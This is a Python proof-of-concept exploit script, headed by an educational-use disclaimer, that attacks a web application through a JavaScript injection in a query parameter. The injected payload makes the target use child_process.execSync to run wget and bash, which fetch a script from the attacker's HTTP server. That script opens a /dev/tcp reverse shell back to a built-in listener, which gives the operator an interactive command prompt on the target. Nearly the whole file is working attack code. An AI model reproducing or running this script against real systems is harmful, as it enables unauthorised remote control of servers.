# DISCLAIMER:
# This script is a Proof of Concept (PoC) for educational purposes only.
# Do not use it for illegal activities. The author is not responsible for any misuse.

#!/usr/bin/env python3
import argparse
import os
import socket
import subprocess
import sys
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Colors for output
GREEN = "\033[92m"
RED = "\033[91m"
ORANGE = "\033[93m"
RESET = "\033[0m"

listener_socket = None
shell_active = False

def create_payload(lhost, lport):
    payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
"""
    with open("payload.sh", "w") as f:
        f.write(payload)
    os.chmod("payload.sh", 0o755)
    print(f"{GREEN}[+] Payload created at payload.sh{RESET}")

def start_http_server():
    # Start HTTP server on port 80 serving current directory
    server_address = ("", 80)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    print(f"{GREEN}[*] Hosting HTTP server on port 80{RESET}")
    return httpd

def start_python_listener(lhost, lport, http_server):
    def listener():
        global listener_socket, shell_active
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            listener_socket = s
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(10)  # wait max 10 seconds for shell
            s.bind((lhost, lport))
            s.listen(1)
            try:
                conn, addr = s.accept()
            except socket.timeout:
                print(f"{RED}[-] Exploit sent, and executed... looks like this isn't vulnerable with this poc{RESET}")
                http_server.shutdown()
                os._exit(1)

            # Peek first bytes to detect HTTP traffic
            try:
                initial_data = conn.recv(1024, socket.MSG_PEEK)
            except Exception:
                initial_data = b""

            if initial_data.startswith(b"GET") or initial_data.startswith(b"POST") or b"HTTP/" in initial_data:
                print(f"{RED}[-] Detected HTTP traffic instead of reverse shell. Target likely not vulnerable.{RESET}")
                conn.close()
                http_server.shutdown()
                os._exit(1)

            shell_active = True
            print(f"{GREEN}[+] PWNed {addr[0]} !!{RESET}")
            print(f"{ORANGE}[!] Type 'exit' to leave the session{RESET}")
            http_server.shutdown()

            try:
                conn.settimeout(None)  # no timeout in shell
                while True:
                    command = input("$ ")
                    if command.strip() == "exit":
                        conn.sendall(b"exit\n")
                        break
                    conn.sendall((command + "\n").encode())
                    response = b""
                    while True:
                        part = conn.recv(4096)
                        if not part:
                            break
                        response += part
                        if len(part) < 4096:
                            break
                    print(response.decode(errors="ignore"), end="")
            except KeyboardInterrupt:
                print(f"\n{ORANGE}[!] Ctrl+C pressed, exiting shell session...{RESET}")
            except Exception as e:
                print(f"{RED}[!] Shell Error: {e}{RESET}")
            finally:
                conn.close()
                os._exit(0)

    thread = threading.Thread(target=listener, daemon=False)
    thread.start()
    return thread

def trigger_remote(rhost, rport, lhost, lport):
    cmd = f"wget http://{lhost}/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh"
    import urllib.parse
    encoded_cmd = urllib.parse.quote(cmd)
    url = f"http://{rhost}:{rport}/?useWith=1&varName=%7B%20a%3A%20b%20%3D%20global.process.mainModule.require%28%27child_process%27%29.execSync%28%27{encoded_cmd}%27%29%20%7D"
    print(f"{GREEN}[*] Triggering remote execution{RESET}")
    try:
        import requests
        resp = requests.get(url, timeout=5)
        if resp.status_code != 200:
            print(f"{RED}[!] Target responded with HTTP {resp.status_code}{RESET}")
    except requests.exceptions.ReadTimeout:
        # Known to happen when shell opens, suppress as info only
        pass
    except Exception as e:
        print(f"{RED}[!] HTTP Trigger Error: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(description="PoC exploit script")
    parser.add_argument("-rhost", required=True, help="Target IP")
    parser.add_argument("-rport", type=int, required=True, help="Target port")
    parser.add_argument("-lhost", required=True, help="Local IP (HTTP server and listener)")
    parser.add_argument("-lport", type=int, required=True, help="Local port (listener for reverse shell)")
    args = parser.parse_args()

    create_payload(args.lhost, args.lport)
    http_server = start_http_server()

    listener_thread = start_python_listener(args.lhost, args.lport, http_server)

    try:
        trigger_remote(args.rhost, args.rport, args.lhost, args.lport)
    except KeyboardInterrupt:
        print(f"{RED}\n[!] Ctrl+C pressed before exploit triggered. Stopping.{RESET}")
        http_server.shutdown()
        os._exit(1)

    # Wait for listener thread to finish (shell session)
    try:
        while listener_thread.is_alive():
            listener_thread.join(timeout=1)
    except KeyboardInterrupt:
        print(f"\n{ORANGE}[*] Ctrl+C pressed. Dumping connection. {RESET}")
        http_server.shutdown()
        os._exit(0)

if __name__ == "__main__":
    main()
